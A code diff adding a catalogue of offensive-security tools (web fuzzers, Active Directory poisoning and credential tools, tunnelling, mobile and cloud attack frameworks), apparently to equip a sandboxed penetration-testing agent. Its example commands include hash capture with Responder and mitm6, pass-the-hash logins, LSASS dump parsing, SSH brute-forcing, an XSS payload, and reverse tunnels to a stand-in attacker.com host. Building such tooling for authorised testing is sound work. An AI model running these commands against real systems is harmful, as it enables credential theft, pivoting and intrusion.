@@ -1,0 +1,827 @@
+"""Arsenal v0.2 — additional 50 tools.
+
+Depends on #251 (Arsenal v0.1) landing first. This module imports the
+v0.1 REGISTRY and EXTENDS it with 50 additional tools across the same
+seven categories, plus new categories:
+
+- web (more):    nikto, wfuzz, wpscan, gobuster, dirsearch, amass,
+                  aquatone, gowitness, naabu, gau, waybackurls,
+                  arjun, paramspider, gf, kxss, qsreplace,
+                  uro, anew, httprobe, mantra, secretfinder
+- ad (more):     evil-winrm, responder, mitm6, enum4linux-ng, smbclient,
+                  rpcclient, ldapsearch, smbmap, crackmapexec (legacy),
+                  pypykatz, mimikatz (via lazagne family)
+- tunneling/c2:  chisel, ligolo-ng, socat, ssh (port forward), proxychains
+- mobile (more): frida, objection, mobsf, apksigner, apkanalyzer, drozer
+- cloud (more):  pacu, scoutsuite, cloudfox, prowler, kube-bench
+- crypto/decode (more): cyberchef-cli, magic-wormhole-cracker
+
+Each tool follows the same ToolSpec contract from v0.1 — declarative
+arg schemas + examples + install hints. To merge into the live
+registry at load time:
+
+    from decepticon.arsenal.registry import REGISTRY
+    from decepticon.arsenal.registry_extras import REGISTRY_EXTRAS
+    ALL_TOOLS = REGISTRY + REGISTRY_EXTRAS
+    # Or feed both into build_arsenal_server(sandbox)
+"""
+
+from __future__ import annotations
+
+from decepticon.arsenal.registry import ArgSchema, ToolSpec
+
+REGISTRY_EXTRAS: list[ToolSpec] = [
+    # ──────── web (more) ────────
+    ToolSpec(
+        name="nikto",
+        binary="nikto",
+        category="web",
+        description="Web server vuln scanner — 6500+ dangerous files/CGIs, outdated server versions, version-specific bugs.",
+        args=[
+            ArgSchema("host", str, flag="-h", required=True),
+            ArgSchema("port", int, flag="-p"),
+            ArgSchema("ssl", bool, flag="-ssl"),
+            ArgSchema("output", str, flag="-o"),
+            ArgSchema(
+                "format",
+                str,
+                flag="-Format",
+                default="json",
+                choices=["csv", "htm", "json", "txt", "xml"],
+            ),
+            ArgSchema("tuning", str, flag="-Tuning", description="1-9,b,c,x"),
+        ],
+        examples=["nikto -h https://target.com -o /tmp/nikto.json -Format json"],
+        install_hint="apt install nikto",
+    ),
+    ToolSpec(
+        name="wfuzz",
+        binary="wfuzz",
+        category="web",
+        description="Web app brute-forcer — fuzz any HTTP request component.",
+        args=[
+            ArgSchema("wordlist", str, flag="-w", required=True),
+            ArgSchema("url", str, flag="-u", required=True),
+            ArgSchema("hide_codes", str, flag="--hc", description="Comma-sep status codes"),
+            ArgSchema("filter_chars", int, flag="--hh"),
+            ArgSchema("output", str, flag="-f"),
+            ArgSchema("threads", int, flag="-t", default=10),
+        ],
+        examples=["wfuzz -w common.txt -u https://target.com/FUZZ --hc 404"],
+        install_hint="pipx install wfuzz",
+    ),
+    ToolSpec(
+        name="wpscan",
+        binary="wpscan",
+        category="web",
+        description="WordPress vulnerability scanner — plugins, themes, users, version-CVE matching.",
+        args=[
+            ArgSchema("url", str, flag="--url", required=True),
+            ArgSchema(
+                "enumerate",
+                str,
+                flag="--enumerate",
+                default="vp,vt,u",
+                description="vp=vuln-plugins, vt=vuln-themes, u=users, ap=all-plugins",
+            ),
+            ArgSchema("api_token", str, flag="--api-token"),
+            ArgSchema("output", str, flag="--output"),
+            ArgSchema("format", str, flag="--format", default="json"),
+        ],
+        examples=["wpscan --url https://target.com --enumerate vp,vt,u --format json"],
+        install_hint="apt install wpscan OR gem install wpscan",
+    ),
+    ToolSpec(
+        name="gobuster",
+        binary="gobuster",
+        category="web",
+        description="Dir / vhost / DNS / fuzz brute-forcer in Go. Faster than ffuf for some workloads.",
+        args=[
+            ArgSchema(
+                "subcommand",
+                str,
+                required=True,
+                choices=["dir", "dns", "fuzz", "vhost", "s3", "gcs"],
+            ),
+            ArgSchema("url", str, flag="-u"),
+            ArgSchema("wordlist", str, flag="-w", required=True),
+            ArgSchema("threads", int, flag="-t", default=50),
+            ArgSchema("status_codes", str, flag="-s"),
+            ArgSchema("extensions", str, flag="-x"),
+            ArgSchema("output", str, flag="-o"),
+        ],
+        examples=["gobuster dir -u https://target.com -w common.txt -x php,html,bak"],
+        install_hint="apt install gobuster OR go install github.com/OJ/gobuster/v3@latest",
+    ),
+    ToolSpec(
+        name="dirsearch",
+        binary="dirsearch",
+        category="web",
+        description="Web path brute-forcer — recursive, status-filtered, multi-format output.",
+        args=[
+            ArgSchema("url", str, flag="-u", required=True),
+            ArgSchema("wordlist", str, flag="-w"),
+            ArgSchema("extensions", str, flag="-e"),
+            ArgSchema("threads", int, flag="-t", default=30),
+            ArgSchema("output", str, flag="--output-format"),
+            ArgSchema("recursive", bool, flag="-r"),
+        ],
+        examples=["dirsearch -u https://target.com -e php,html,js -r"],
+        install_hint="pipx install dirsearch",
+    ),
+    ToolSpec(
+        name="amass",
+        binary="amass",
+        category="recon",
+        description="OWASP Amass — deep subdomain enumeration via 100+ sources.",
+        args=[
+            ArgSchema(
+                "subcommand", str, required=True, choices=["enum", "intel", "viz", "track", "db"]
+            ),
+            ArgSchema("domain", str, flag="-d"),
+            ArgSchema("passive", bool, flag="-passive"),
+            ArgSchema("active", bool, flag="-active"),
+            ArgSchema("brute", bool, flag="-brute"),
+            ArgSchema("output", str, flag="-o"),
+            ArgSchema("json_output", str, flag="-json"),
+        ],
+        examples=["amass enum -d target.com -passive -o subs.txt"],
+        install_hint="apt install amass OR snap install amass",
+    ),
+    ToolSpec(
+        name="aquatone",
+        binary="aquatone",
+        category="recon",
+        description="Visual recon — screenshot HTTP responses across host list, cluster by similarity.",
+        args=[
+            ArgSchema("output_dir", str, flag="-out", default="."),
+            ArgSchema("ports", str, flag="-ports", default="large"),
+            ArgSchema("threads", int, flag="-threads", default=5),
+        ],
+        examples=["cat hosts.txt | aquatone -out /tmp/aquatone -ports large"],
+        install_hint="go install github.com/michenriksen/aquatone@latest",
+    ),
+    ToolSpec(
+        name="gowitness",
+        binary="gowitness",
+        category="recon",
+        description="Headless-Chromium-driven screenshot tool for web hosts.",
+        args=[
+            ArgSchema(
+                "subcommand", str, required=True, choices=["single", "file", "nmap", "report"]
+            ),
+            ArgSchema("url", str, flag="--url"),
+            ArgSchema("file", str, flag="--file"),
+            ArgSchema("output_dir", str, flag="--screenshot-path", default="screenshots"),
+            ArgSchema("port", int, flag="--port"),
+        ],
+        examples=["gowitness file --file hosts.txt --screenshot-path /tmp/shots"],
+        install_hint="go install github.com/sensepost/gowitness@latest",
+    ),
+    ToolSpec(
+        name="naabu",
+        binary="naabu",
+        category="recon",
+        description="Fast port scanner in Go — SYN + CONNECT modes, integrates w/ httpx/nuclei pipelines.",
+        args=[
+            ArgSchema("host", str, flag="-host"),
+            ArgSchema("list", str, flag="-l"),
+            ArgSchema("ports", str, flag="-p", default="top-1000"),
+            ArgSchema("rate", int, flag="-rate", default=1000),
+            ArgSchema("output", str, flag="-o"),
+            ArgSchema("json", bool, flag="-json"),
+        ],
+        examples=["naabu -l hosts.txt -p top-1000 -o open-ports.txt"],
+        install_hint="go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
+    ),
+    ToolSpec(
+        name="gau",
+        binary="gau",
+        category="recon",
+        description="GetAllUrls — fetch known URLs from AlienVault OTX, Wayback, Common Crawl, URLScan.",
+        args=[
+            ArgSchema("domain", str, description="Positional"),
+            ArgSchema("subs", bool, flag="--subs"),
+            ArgSchema(
+                "providers", str, flag="--providers", default="wayback,otx,commoncrawl,urlscan"
+            ),
+            ArgSchema("output", str, flag="-o"),
+        ],
+        examples=["gau target.com --subs -o urls.txt"],
+        install_hint="go install github.com/lc/gau/v2/cmd/gau@latest",
+    ),
+    ToolSpec(
+        name="waybackurls",
+        binary="waybackurls",
+        category="recon",
+        description="Wayback Machine URL dump — historical URLs for a domain.",
+        args=[
+            ArgSchema("domain", str, description="Positional or stdin"),
+            ArgSchema("dates", bool, flag="-dates"),
+            ArgSchema("get_versions", bool, flag="-get-versions"),
+        ],
+        examples=["echo target.com | waybackurls > /tmp/wayback.txt"],
+        install_hint="go install github.com/tomnomnom/waybackurls@latest",
+    ),
+    ToolSpec(
+        name="arjun",
+        binary="arjun",
+        category="web",
+        description="HTTP parameter discovery — finds hidden GET/POST params via wordlist + behavior diff.",
+        args=[
+            ArgSchema("url", str, flag="-u", required=True),
+            ArgSchema(
+                "method", str, flag="-m", default="GET", choices=["GET", "POST", "JSON", "XML"]
+            ),
+            ArgSchema("output", str, flag="-oJ"),
+            ArgSchema("threads", int, flag="-t", default=2),
+        ],
+        examples=["arjun -u https://target.com/api -oJ params.json"],
+        install_hint="pipx install arjun",
+    ),
+    ToolSpec(
+        name="paramspider",
+        binary="paramspider",
+        category="recon",
+        description="Mine GET params from Wayback archives — surfaces forgotten endpoints.",
+        args=[
+            ArgSchema("domain", str, flag="-d", required=True),
+            ArgSchema("level", str, flag="-l", default="high"),
+            ArgSchema("output", str, flag="-o"),
+        ],
+        examples=["paramspider -d target.com -o /tmp/params.txt"],
+        install_hint="pipx install paramspider",
+    ),
+    ToolSpec(
+        name="gf",
+        binary="gf",
+        category="web",
+        description="Tomnomnom's gf — grep-pattern recognizer for URL categories (xss, ssrf, sqli, etc).",
+        args=[
+            ArgSchema("pattern", str, required=True, description="Positional: pattern name"),
+            ArgSchema("input_file", str, description="Positional after pattern"),
+        ],
+        examples=["cat urls.txt | gf ssrf"],
+        install_hint="go install github.com/tomnomnom/gf@latest",
+    ),
+    ToolSpec(
+        name="kxss",
+        binary="kxss",
+        category="web",
+        description="XSS reflection finder — Tomnomnom's kxss; reads URLs from stdin, prints those reflecting payloads.",
+        args=[],
+        examples=["cat urls.txt | kxss"],
+        install_hint="go install github.com/Emoe/kxss@latest",
+    ),
+    ToolSpec(
+        name="qsreplace",
+        binary="qsreplace",
+        category="utility",
+        description="Replace query-string values w/ a payload — Tomnomnom helper.",
+        args=[
+            ArgSchema("payload", str, required=True, description="Positional"),
+        ],
+        examples=["cat urls.txt | qsreplace '\"><script>alert(1)</script>'"],
+        install_hint="go install github.com/tomnomnom/qsreplace@latest",
+    ),
+    ToolSpec(
+        name="anew",
+        binary="anew",
+        category="utility",
+        description="Append-only-new-lines — keep a deduped, growing list of URLs/hosts across runs.",
+        args=[
+            ArgSchema("file", str, required=True, description="Positional"),
+            ArgSchema("dry_run", bool, flag="-d"),
+            ArgSchema("quiet", bool, flag="-q"),
+        ],
+        examples=["subfinder -d target.com | anew subs.txt"],
+        install_hint="go install github.com/tomnomnom/anew@latest",
+    ),
+    ToolSpec(
+        name="uro",
+        binary="uro",
+        category="utility",
+        description="URL deduplicator — clusters similar URLs (different query strings/ids).",
+        args=[],
+        examples=["cat urls.txt | uro"],
+        install_hint="pipx install uro",
+    ),
+    ToolSpec(
+        name="httprobe",
+        binary="httprobe",
+        category="recon",
+        description="Concurrent HTTP/HTTPS prober — given hosts list, output live HTTP URLs.",
+        args=[
+            ArgSchema("prefer_https", bool, flag="-s"),
+            ArgSchema("concurrency", int, flag="-c", default=50),
+        ],
+        examples=["cat hosts.txt | httprobe -s"],
+        install_hint="go install github.com/tomnomnom/httprobe@latest",
+    ),
+    ToolSpec(
+        name="secretfinder",
+        binary="SecretFinder",
+        category="web",
+        description="Extract secrets from JavaScript files via regex patterns.",
+        args=[
+            ArgSchema("input", str, flag="-i", required=True),
+            ArgSchema("output", str, flag="-o", default="cli"),
+            ArgSchema("burp_export", str, flag="-b"),
+        ],
+        examples=["python3 SecretFinder.py -i https://target.com/static/app.js -o results.html"],
+        install_hint="git clone https://github.com/m4ll0k/SecretFinder.git",
+    ),
+    # ──────── AD (more) ────────
+    ToolSpec(
+        name="evil-winrm",
+        binary="evil-winrm",
+        category="ad",
+        description="WinRM shell for Windows targets w/ auto-loaded post-exploitation scripts.",
+        args=[
+            ArgSchema("ip", str, flag="-i", required=True),
+            ArgSchema("user", str, flag="-u", required=True),
+            ArgSchema("password", str, flag="-p"),
+            ArgSchema("hash", str, flag="-H", description="NTLM hash for pass-the-hash"),
+            ArgSchema("scripts_path", str, flag="-s"),
+            ArgSchema("executables_path", str, flag="-e"),
+        ],
+        examples=["evil-winrm -i 10.0.0.5 -u alice -H AAD3B435B51404EEAAD3B435B51404EE:..."],
+        install_hint="gem install evil-winrm",
+    ),
+    ToolSpec(
+        name="responder",
+        binary="responder",
+        category="ad",
+        description="LLMNR/NBT-NS/MDNS poisoner — captures NTLMv1/v2 hashes for offline crack or relay.",
+        args=[
+            ArgSchema("interface", str, flag="-I", required=True),
+            ArgSchema("analyze", bool, flag="-A", description="Analyze mode (no poison)"),
+            ArgSchema("wpad", bool, flag="-w"),
+            ArgSchema("force_wpad_auth", bool, flag="-F"),
+            ArgSchema("disable_ssl", bool, flag="--lm"),
+        ],
+        requires_root=True,
+        examples=["responder -I eth0 -wF"],
+        install_hint="apt install responder",
+    ),
+    ToolSpec(
+        name="mitm6",
+        binary="mitm6",
+        category="ad",
+        description="IPv6 DHCP poisoner — forces Windows hosts to use attacker as DNS for cred relay.",
+        args=[
+            ArgSchema("interface", str, flag="-i", required=True),
+            ArgSchema("domain", str, flag="-d"),
+            ArgSchema("host_allowlist", str, flag="-hw"),
+        ],
+        requires_root=True,
+        examples=["mitm6 -i eth0 -d corp.local"],
+        install_hint="pipx install mitm6",
+    ),
+    ToolSpec(
+        name="enum4linux-ng",
+        binary="enum4linux-ng",
+        category="ad",
+        description="Maintained replacement for enum4linux — SMB/RPC/LDAP enum against Windows.",
+        args=[
+            ArgSchema("target", str, description="Positional"),
+            ArgSchema("user", str, flag="-u"),
+            ArgSchema("password", str, flag="-p"),
+            ArgSchema("aggressive", bool, flag="-A"),
+            ArgSchema("yaml_output", str, flag="-oY"),
+        ],
+        examples=["enum4linux-ng -A 10.0.0.5 -oY /tmp/enum.yaml"],
+        install_hint="pipx install enum4linux-ng",
+    ),
+    ToolSpec(
+        name="smbclient",
+        binary="smbclient",
+        category="ad",
+        description="SMB client — list shares, browse files, get/put.",
+        args=[
+            ArgSchema("share", str, required=True, description="Positional, e.g. //10.0.0.5/share"),
+            ArgSchema("user", str, flag="-U"),
+            ArgSchema("password_prompt", bool, flag="-N", description="No password prompt"),
+            ArgSchema("command", str, flag="-c"),
+        ],
+        examples=["smbclient -L //10.0.0.5 -U 'alice%Pass!'"],
+        install_hint="apt install smbclient",
+    ),
+    ToolSpec(
+        name="rpcclient",
+        binary="rpcclient",
+        category="ad",
+        description="Samba RPC client — enumerate users, groups, shares, policies via MS-RPC.",
+        args=[
+            ArgSchema("target", str, description="Positional"),
+            ArgSchema("user", str, flag="-U"),
+            ArgSchema("command", str, flag="-c"),
+        ],
+        examples=["rpcclient -U 'alice%Pass!' 10.0.0.5 -c 'enumdomusers'"],
+        install_hint="apt install samba-common-bin",
+    ),
+    ToolSpec(
+        name="ldapsearch",
+        binary="ldapsearch",
+        category="ad",
+        description="LDAP query tool — schema enum, user/group dumps, ACL inspect.",
+        args=[
+            ArgSchema("uri", str, flag="-H", required=True),
+            ArgSchema("bind_dn", str, flag="-D"),
+            ArgSchema("password", str, flag="-w"),
+            ArgSchema("base_dn", str, flag="-b"),
+            ArgSchema("filter", str, description="Positional after -b"),
+            ArgSchema("attrs", str, description="Positional after filter"),
+        ],
+        examples=[
+            "ldapsearch -x -H ldap://10.0.0.5 -D 'alice@corp' -w 'Pass!' -b 'dc=corp,dc=local'"
+        ],
+        install_hint="apt install ldap-utils",
+    ),
+    ToolSpec(
+        name="smbmap",
+        binary="smbmap",
+        category="ad",
+        description="SMB share enum + permission audit + cmd exec.",
+        args=[
+            ArgSchema("host", str, flag="-H"),
+            ArgSchema("user", str, flag="-u"),
+            ArgSchema("password", str, flag="-p"),
+            ArgSchema("hash", str, flag="--hash"),
+            ArgSchema("share", str, flag="-s"),
+            ArgSchema("recursive", bool, flag="-R"),
+        ],
+        examples=["smbmap -H 10.0.0.5 -u alice -p 'Pass!'"],
+        install_hint="pipx install smbmap",
+    ),
+    ToolSpec(
+        name="pypykatz",
+        binary="pypykatz",
+        category="ad",
+        description="Pure-python Mimikatz — parse LSASS dumps, SAM, NTDS for credentials.",
+        args=[
+            ArgSchema(
+                "subcommand", str, required=True, choices=["lsa", "registry", "dpapi", "kerberos"]
+            ),
+            ArgSchema("operation", str, description="Positional, e.g. 'minidump'"),
+            ArgSchema("input", str, description="Positional path to dump file"),
+            ArgSchema("output", str, flag="-o"),
+        ],
+        examples=["pypykatz lsa minidump /tmp/lsass.dmp"],
+        install_hint="pipx install pypykatz",
+    ),
+    # ──────── Tunneling / C2 ────────
+    ToolSpec(
+        name="chisel",
+        binary="chisel",
+        category="tunneling",
+        description="HTTP-tunneled TCP/UDP forwarder — pivot through HTTP-only egress.",
+        args=[
+            ArgSchema("mode", str, required=True, choices=["server", "client"]),
+            ArgSchema(
+                "bind_url",
+                str,
+                description="Positional, e.g. '0.0.0.0:8080' or 'attacker.com:8080'",
+            ),
+            ArgSchema("forward", str, description="Positional, e.g. 'R:8888:127.0.0.1:5432'"),
+            ArgSchema("reverse", bool, flag="--reverse"),
+            ArgSchema("auth", str, flag="--auth"),
+        ],
+        examples=[
+            "chisel server --reverse --port 8080",
+            "chisel client --auth user:pw attacker.com:8080 R:9999:internal:80",
+        ],
+        install_hint="go install github.com/jpillora/chisel@latest",
+    ),
+    ToolSpec(
+        name="ligolo-ng",
+        binary="ligolo-ng",
+        category="tunneling",
+        description="Layer-3 tunnel — full subnet access through compromised host. Better than chisel for deep pivots.",
+        args=[
+            ArgSchema("mode", str, required=True, choices=["proxy", "agent"]),
+            ArgSchema("self_signed", bool, flag="-selfcert"),
+            ArgSchema("listen", str, flag="-laddr"),
+            ArgSchema("connect", str, flag="-connect"),
+        ],
+        examples=[
+            "ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601",
+            "ligolo-ng agent -connect attacker.com:11601 -ignore-cert",
+        ],
+        install_hint="go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest",
+    ),
+    ToolSpec(
+        name="socat",
+        binary="socat",
+        category="tunneling",
+        description="Bidirectional data relay — TCP/UDP/UNIX/PTY/EXEC bridges.",
+        args=[
+            ArgSchema(
+                "source",
+                str,
+                required=True,
+                description="Positional, e.g. 'TCP-LISTEN:8888,reuseaddr,fork'",
+            ),
+            ArgSchema("destination", str, required=True, description="Positional"),
+        ],
+        examples=["socat TCP-LISTEN:8888,reuseaddr,fork TCP:internal:80"],
+        install_hint="apt install socat",
+    ),
+    ToolSpec(
+        name="proxychains",
+        binary="proxychains4",
+        category="tunneling",
+        description="Force a command's TCP traffic through a SOCKS chain.",
+        args=[
+            ArgSchema("config", str, flag="-f"),
+            ArgSchema("quiet", bool, flag="-q"),
+            ArgSchema("command", str, multi=True, required=True, description="Positional w/ args"),
+        ],
+        examples=["proxychains4 -q nmap -sT 10.10.10.5"],
+        install_hint="apt install proxychains4",
+    ),
+    # ──────── Mobile (more) ────────
+    ToolSpec(
+        name="frida",
+        binary="frida",
+        category="mobile",
+        description="Frida CLI — dynamic instrumentation injection on running processes.",
+        args=[
+            ArgSchema("device", str, flag="-U", description="USB device"),
+            ArgSchema("process", str, flag="-n"),
+            ArgSchema("file", str, flag="-f", description="Spawn + attach"),
+            ArgSchema("script", str, flag="-l"),
+            ArgSchema("codeshare", str, flag="--codeshare"),
+        ],
+        examples=["frida -U -f com.target.app -l hook.js"],
+        install_hint="pipx install frida-tools",
+    ),
+    ToolSpec(
+        name="objection",
+        binary="objection",
+        category="mobile",
+        description="Frida-based runtime mobile-app explorer — REPL w/ built-in jailbreak/root/SSL-pin bypass.",
+        args=[
+            ArgSchema(
+                "subcommand",
+                str,
+                required=True,
+                choices=["explore", "patchapk", "patchipa", "signapk"],
+            ),
+            ArgSchema("gadget", str, flag="-g"),
+            ArgSchema("startup_command", str, flag="-s"),
+        ],
+        examples=["objection -g com.target.app explore"],
+        install_hint="pipx install objection",
+    ),
+    ToolSpec(
+        name="mobsf",
+        binary="mobsf",
+        category="mobile",
+        description="Mobile Security Framework — static + dynamic analysis of APK/IPA/AppX.",
+        args=[
+            ArgSchema("port", int, flag="-p", default=8000),
+            ArgSchema("host", str, flag="-H", default="0.0.0.0"),
+        ],
+        examples=["docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf"],
+        install_hint="docker pull opensecurity/mobile-security-framework-mobsf",
+    ),
+    ToolSpec(
+        name="apksigner",
+        binary="apksigner",
+        category="mobile",
+        description="Android APK signing + verification.",
+        args=[
+            ArgSchema("subcommand", str, required=True, choices=["sign", "verify"]),
+            ArgSchema("keystore", str, flag="--ks"),
+            ArgSchema("ks_pass", str, flag="--ks-pass"),
+            ArgSchema("apk", str, description="Positional"),
+        ],
+        examples=["apksigner verify --verbose target.apk"],
+        install_hint="apt install apksigner OR via Android SDK build-tools",
+    ),
+    ToolSpec(
+        name="apkanalyzer",
+        binary="apkanalyzer",
+        category="mobile",
+        description="Android SDK APK analyzer — manifest, dex stats, size, resources.",
+        args=[
+            ArgSchema(
+                "subcommand", str, required=True, description="Positional, e.g. 'manifest print'"
+            ),
+            ArgSchema("apk", str, description="Positional"),
+        ],
+        examples=["apkanalyzer manifest print target.apk"],
+        install_hint="via Android SDK command-line tools",
+    ),
+    ToolSpec(
+        name="drozer",
+        binary="drozer",
+        category="mobile",
+        description="Android IPC security framework — content-provider + intent + activity attacks.",
+        args=[
+            ArgSchema(
+                "subcommand", str, required=True, choices=["console", "agent", "module", "server"]
+            ),
+            ArgSchema("operation", str, description="Positional, e.g. 'connect'"),
+        ],
+        examples=["drozer console connect"],
+        install_hint="pip install drozer",
+    ),
+    # ──────── Cloud (more) ────────
+    ToolSpec(
+        name="pacu",
+        binary="pacu",
+        category="cloud",
+        description="Pacu — AWS exploitation framework w/ 50+ modules (escalation, lateral, persistence, exfil).",
+        args=[
+            ArgSchema("session", str, flag="--session"),
+            ArgSchema("module", str, flag="--module-name"),
+            ArgSchema("module_args", str, flag="--module-args"),
+        ],
+        examples=["pacu --session myrun"],
+        install_hint="pipx install pacu",
+    ),
+    ToolSpec(
+        name="scoutsuite",
+        binary="scout",
+        category="cloud",
+        description="Multi-cloud security auditing — AWS/Azure/GCP/Aliyun config + IAM review.",
+        args=[
+            ArgSchema(
+                "provider", str, required=True, choices=["aws", "azure", "gcp", "aliyun", "oci"]
+            ),
+            ArgSchema("report_dir", str, flag="--report-dir"),
+            ArgSchema("profile", str, flag="--profile"),
+        ],
+        examples=["scout aws --report-dir /tmp/scout"],
+        install_hint="pipx install scoutsuite",
+    ),
+    ToolSpec(
+        name="cloudfox",
+        binary="cloudfox",
+        category="cloud",
+        description="Find exploitable cloud-attack-paths quickly. Better signal-to-noise than scoutsuite for offense.",
+        args=[
+            ArgSchema("provider", str, required=True, choices=["aws", "azure", "gcp"]),
+            ArgSchema("command", str, required=True, description="Positional, e.g. 'all-checks'"),
+            ArgSchema("profile", str, flag="--profile"),
+            ArgSchema("output", str, flag="--outdir"),
+        ],
+        examples=["cloudfox aws all-checks --profile default"],
+        install_hint="go install github.com/BishopFox/cloudfox@latest",
+    ),
+    ToolSpec(
+        name="prowler",
+        binary="prowler",
+        category="cloud",
+        description="Prowler — CIS-benchmark-aligned cloud security auditor. AWS/Azure/GCP/Kubernetes.",
+        args=[
+            ArgSchema(
+                "provider", str, required=True, choices=["aws", "azure", "gcp", "kubernetes"]
+            ),
+            ArgSchema("checks", str, flag="-c"),
+            ArgSchema(
+                "output_format", str, flag="-M", default="json", choices=["json", "csv", "html"]
+            ),
+            ArgSchema("output_dir", str, flag="-o"),
+        ],
+        examples=["prowler aws -M json -o /tmp/prowler"],
+        install_hint="pipx install prowler",
+    ),
+    ToolSpec(
+        name="kube-bench",
+        binary="kube-bench",
+        category="cloud",
+        description="Kubernetes CIS benchmark — node/control-plane security audit.",
+        args=[
+            ArgSchema("subcommand", str, default="run", choices=["run", "version"]),
+            ArgSchema("benchmark", str, flag="--benchmark"),
+            ArgSchema("output", str, flag="--outputfile"),
+            ArgSchema("targets", str, flag="--targets"),
+        ],
+        examples=["kube-bench run --benchmark cis-1.7"],
+        install_hint="https://github.com/aquasecurity/kube-bench (binary release)",
+    ),
+    # ──────── Crypto/utility (more) ────────
+    ToolSpec(
+        name="cyberchef-cli",
+        binary="chef",
+        category="crypto",
+        description="CyberChef CLI — apply CyberChef recipes (JSON) to input data.",
+        args=[
+            ArgSchema("recipe", str, flag="-r", required=True),
+            ArgSchema("input_file", str, flag="-i"),
+            ArgSchema("output", str, flag="-o"),
+        ],
+        examples=["chef -r 'From_Base64,From_Hex' -i /tmp/blob.b64"],
+        install_hint="npm i -g cyberchef-cli OR via Docker",
+    ),
+    ToolSpec(
+        name="ares",
+        binary="ares",
+        category="crypto",
+        description="Ares — Rust rewrite of Ciphey (faster, current maintenance).",
+        args=[
+            ArgSchema("ciphertext", str, flag="-t", required=True),
+            ArgSchema("language", str, flag="--language", default="en"),
+            ArgSchema("quiet", bool, flag="-q"),
+        ],
+        examples=["ares -t 'aGVsbG8gd29ybGQ='"],
+        install_hint="cargo install ares",
+    ),
+    ToolSpec(
+        name="medusa",
+        binary="medusa",
+        category="crypto",
+        description="Parallel network login brute-forcer — alternative to hydra.",
+        args=[
+            ArgSchema("host", str, flag="-h"),
+            ArgSchema("host_file", str, flag="-H"),
+            ArgSchema("user", str, flag="-u"),
+            ArgSchema("user_file", str, flag="-U"),
+            ArgSchema("password", str, flag="-p"),
+            ArgSchema("password_file", str, flag="-P"),
+            ArgSchema("module", str, flag="-M", required=True),
+            ArgSchema("threads", int, flag="-t", default=4),
+        ],
+        examples=["medusa -h 10.0.0.5 -U users.txt -P rockyou.txt -M ssh -t 4"],
+        install_hint="apt install medusa",
+    ),
+    # ──────── RE / pwn extras ────────
+    ToolSpec(
+        name="pwntools-cli",
+        binary="pwn",
+        category="re",
+        description="pwn CLI utilities — checksec, disasm, hex, shellcraft, libcdb.",
+        args=[
+            ArgSchema(
+                "subcommand",
+                str,
+                required=True,
+                description="checksec / disasm / hex / shellcraft / libcdb / cyclic / ...",
+            ),
+            ArgSchema("args", str, multi=True, description="Subcommand args"),
+        ],
+        examples=["pwn checksec /tmp/binary", "pwn cyclic 100"],
+        install_hint="pipx install pwntools",
+    ),
+    ToolSpec(
+        name="checksec",
+        binary="checksec",
+        category="re",
+        description="Standalone checksec — binary security mitigations report.",
+        args=[
+            ArgSchema("file", str, flag="--file"),
+            ArgSchema("dir", str, flag="--dir"),
+            ArgSchema("output", str, flag="--output", default="cli"),
+        ],
+        examples=["checksec --file /tmp/binary"],
+        install_hint="apt install checksec",
+    ),
+    ToolSpec(
+        name="ROPgadget",
+        binary="ROPgadget",
+        category="re",
+        description="ROP gadget hunter — extract usable gadgets from ELF/PE/Mach-O.",
+        args=[
+            ArgSchema("binary", str, flag="--binary", required=True),
+            ArgSchema("ropchain", bool, flag="--ropchain"),
+            ArgSchema("depth", int, flag="--depth", default=10),
+            ArgSchema("output", str, flag="-o"),
+        ],
+        examples=["ROPgadget --binary /tmp/target --depth 8 -o /tmp/gadgets.txt"],
+        install_hint="pipx install ROPgadget",
+    ),
+    ToolSpec(
+        name="one_gadget",
+        binary="one_gadget",
+        category="re",
+        description="One-shot libc-execve(/bin/sh) gadget finder.",
+        args=[
+            ArgSchema("libc_path", str, description="Positional"),
+            ArgSchema("level", int, flag="-l"),
+        ],
+        examples=["one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6"],
+        install_hint="gem install one_gadget",
+    ),
+    ToolSpec(
+        name="ghidra-headless",
+        binary="analyzeHeadless",
+        category="re",
+        description="Ghidra headless batch analyzer — script-driven analysis.",
+        args=[
+            ArgSchema("project_dir", str, required=True, description="Positional"),
+            ArgSchema("project_name", str, required=True, description="Positional"),
+            ArgSchema("import_file", str, flag="-import"),
+            ArgSchema("post_script", str, flag="-postScript"),
+            ArgSchema("script_path", str, flag="-scriptPath"),
+            ArgSchema("delete_project", bool, flag="-deleteProject"),
+        ],
+        examples=["analyzeHeadless /tmp/proj PROJ -import /tmp/binary -postScript script.py"],
+        install_hint="Comes with Ghidra; ensure $GHIDRA_HOME/support/analyzeHeadless on PATH",
+    ),
+]
+
+
+__all__ = ["REGISTRY_EXTRAS"]
